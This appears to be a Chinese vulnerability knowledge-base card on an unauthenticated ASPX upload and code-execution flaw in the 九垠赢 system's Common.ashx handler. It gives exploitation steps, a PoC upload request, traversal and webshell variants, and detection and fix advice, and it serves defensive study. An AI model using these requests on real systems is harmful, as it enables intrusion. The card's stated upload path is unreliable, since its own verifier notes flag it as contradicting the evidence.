---
id: web-generic-file-upload-jiuyin-common-uploadtemppicture-aspx
title: 九垠赢系统 Common.ashx uploadtemppicture 未授权上传 ASPX 并执行
type: scenario
domain: web
path: web/generic/file-upload
technique: common-ashx-uploadtemppicture-aspx-upload
tags:
- dotnet
- aspnet
- file-upload
- unrestricted-upload
- webshell
- rce
- code-audit
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 九垠赢系统 前端 6.8.0.46149 / 后端 6.8.0.8666（原文标记）
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:08:13+08:00'
  notes: 漏洞本体成立：Common.ProcessRequest type=uploadtemppicture→SaveUploadTempPicture，仅按上传文件名取最后一段扩展名，无白名单/无认证，实测上传后 aspx 被执行输出 1234。但卡内路径描述与原文截图不符：原文 POC 未传 directory/filename，走 else 分支 uploadPath=MapPath('Files\')，最终截图 URL 为 http://127.0.0.1:9096/Application/Files/tempfile/20250417150533564.aspx（文件名 yyyyMMddHHmmss+随机数 也符合该分支）；卡的一句话结论/利用步骤5/PoC 却写成返回 /Application/App_File/<RetailerID>/<directory>/tempfile 路径，属对原文证据的错误引用，需作者修正（保留 App_File 分支为传 directory 时的变体）。受影响版本原文明确，已设置。frontmatter 无 sources/source_url；未在本机复跑。
url: /docs/web/generic/file-upload/web-generic-file-upload-jiuyin-common-uploadtemppicture-aspx/
draft: false
kb_aliases:
- 九垠赢 文件上传
- Common.ashx uploadtemppicture
- SaveUploadTempPicture
- App_File tempfile webshell
- ASPX 任意文件上传
---

## 一句话结论

`WRM.Web.User.Application.Common.ProcessRequest` 在 `type=uploadtemppicture` 时直接取 `fileList`、`directory`、`filename` 并调用 `SaveUploadTempPicture` 保存文件，没有认证、扩展名校验或路径规范化；上传 `.aspx` 后从返回的 `/Application/App_File/.../tempfile/xxx.aspx` 访问即可执行，形成未授权 RCE。

## 原理

- `Common.ProcessRequest` 从 `context.Request.Params["type"]` 取操作类型；当 `type == "uploadtemppicture"` 时：
  - `filepath = context.Request.Params["directory"]`；
  - `filename = context.Request.Params["filename"]`；
  - `result = this.SaveUploadTempPicture(context, filepath, filename)`；
  - `context.Response.Write(result)` 直接把保存路径返回给请求者。
- `SaveUploadTempPicture(HttpContext context, string newPath, string newName)`：
  - `HttpPostedFile file = context.Request.Files["fileList"]`；
  - `filenames = file.FileName.Split('.')` 仅用于取最后一段扩展名；
  - 若 `newPath` 非空，`uploadPath = Server.MapPath("\\") + "App_File\\" + RetailerID + "\\" + newPath + "\\"`；否则 `uploadPath = Server.MapPath("Files\\")`；
  - `tempUploadPath = uploadPath + "tempfile\\"`；
  - 若 `newName` 非空：`newfilename = newName + "." + filenames[last]`；否则 `newfilename = DateTime.Now.ToString("yyyyMMddHHmmss") + random + "." + filenames[last]`；
  - 若目录不存在则 `Directory.CreateDirectory`，然后 `file.SaveAs(tempUploadPath + newfilename)`。
- 关键缺陷：没有 `Path.GetFileName` 处理、没有扩展名白名单、没有把上传目录设置为不可执行；`newPath` 和 `newName` 来自请求，可控制子目录和文件名主体，扩展名取自上传文件名。IIS 会把 `.aspx` 映射到 ASP.NET 执行，因此上传的 ASPX 内容（如 `<%= "1234"%>`）会被编译执行。
- 上传落点 `App_File/<RetailerID>/<directory>/tempfile/` 位于 Web 应用目录内，返回的 `newurl` 可直接访问，不需要额外解析或包含。

## 触发条件

- 目标为受影响版本的九垠赢系统，前端 `/Application/Common.ashx` 可访问。
- `type=uploadtemppicture` 分支可达；原文代码未显示认证检查，POC 直接请求即成功（实际环境需确认是否匿名可达）。
- IIS 允许上传目录中的 `.aspx` 执行（默认 ASP.NET 应用通常允许；若站点配置了请求过滤/上传目录禁止执行则不成立）。
- 攻击者能发送 multipart/form-data 的 `fileList` 文件字段。

## 利用步骤

1. 确认 `/Application/Common.ashx?type=uploadtemppicture` 可达。
2. 构造 multipart 请求，`fileList` 字段上传 `.aspx` 文件，内容为最小 ASPX 代码（如 `<%= "1234"%>` 或命令执行代码）。
3. 可选：通过 `filename` 指定文件名主体、通过 `directory` 指定子目录（含 `..\` 时可能穿越，取决于 `Server.MapPath` 与目录拼接结果）。
4. 从响应中取出返回的 URL/保存路径（响应格式为 `[newurl,uploadPath+filename,tempUploadPath+filename]`）。
5. 访问 `http://target/Application/App_File/<RetailerID>/<directory>/tempfile/<name>.aspx`，ASPX 被编译执行。
6. 将最小验证页替换为 webshell/命令执行页，获得 Web 进程权限。

## PoC

```http
POST /Application/Common.ashx?type=uploadtemppicture HTTP/1.1
Host: 127.0.0.1:9096
Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394

-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="fileList"; filename="shell.aspx"
Content-Type: application/octet-stream

<%= "1234"%>
-----------------------------21909179191068471382830692394--
```

```text
# 响应返回的访问路径（原文截图）
/Application/App_File/.../tempfile/20250417150533564.aspx
# 浏览器访问后页面输出：1234
```

说明：原文请求示例中 filename 写的是 `test111111.html`，但其复现截图最终 URL 为 `.aspx` 且 ASPX 表达式被执行；上例按截图行为改为 `.aspx`。实际测试请使用无害标记页，不要上传真实 webshell。

## 变体与关联

- 变体：通过 `filename` 指定固定文件名（如 `shell`），避免时间戳随机名；通过 `directory` 控制子目录，尝试 `..\..\` 写到 Web 根或其他可执行目录。
- 变体：上传 `.ashx`、`.asmx`、`.config` 等 IIS 可解析/可影响配置的扩展名，具体取决于站点请求过滤。
- 变体：结合同系统的 HttpCombiner 任意文件读取（见关联卡）读取 web.config/路径信息，辅助定位 Web 根与 RetailerID。
- 关联：[[web-generic-file-upload-extension-zero-check]]（扩展名处理缺陷）、[[web-generic-file-upload-content-type-trust-bypass]]（对比：仅信 Content-Type）、[[web-generic-file-upload-htaccess-handler-override]]（对比：Apache 解析配置）。
- 边界：上传目录被配置为禁止执行、Handler 增加认证/扩展名白名单、或 `fileList` 字段被请求过滤拦截时，RCE 不成立；原文只验证了 ASPX 表达式执行，未给出完整 webshell。

## 检测与防御

- 检测：`Common.ashx?type=uploadtemppicture` 的匿名 multipart 请求；上传文件名以 `.aspx`/`.ashx`/`.asmx` 结尾；`App_File/*/tempfile/` 下新增可执行文件；IIS 日志中出现对 `tempfile/*.aspx` 的访问与编译错误；Web 进程异常子进程/网络连接。
- 修复：该 Handler 增加身份认证与授权；上传扩展名白名单（仅图片），校验 Content-Type 与文件魔数；用 `Path.GetFileName` 去除路径，随机化文件名，禁止用户控制 `directory`；上传目录设置为非 Web 可访问或 IIS 禁止执行（`<requestFiltering>` 拒绝脚本扩展名）。
- 加固：上传文件存储到 Web 根之外，通过受控下载接口读取；最小权限运行应用池；WAF/请求过滤拦截 `.aspx` 上传；文件完整性监控与 webshell 扫描。
